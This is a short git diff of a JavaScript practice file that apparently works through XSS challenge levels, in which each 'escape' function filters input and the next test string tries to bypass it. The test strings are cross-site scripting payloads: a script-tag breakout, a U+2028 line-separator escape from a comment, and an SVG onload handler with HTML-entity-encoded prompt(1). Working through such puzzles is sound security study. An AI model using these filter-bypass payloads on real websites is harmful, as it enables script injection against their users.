@@ -36,7 +36,7 @@ console.log(escape("><script>`#`;prompt(1)`#'</script>"))
 //console.log(escape("prompt(1)"))
 */
 
-
+/*
 // 8
 function escape(input) {
     // prevent input from getting out of comment
@@ -50,3 +50,22 @@ function escape(input) {
 }
 
 console.log(escape("'\u2028prompt(1)\u2028-->'"))
+*/
+
+// 9
+function escape(input) {
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/[\r\n</"]/g, '');
+
+    return '                                \n\
+<script>                                    \n\
+    // console.log("' + input + '");        \n\
+</script> ';
+}   
+
+console.log(escape("<svg onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>"))
+
+const input = 's';
+
+console.log(input.toLocaleLowerCase());
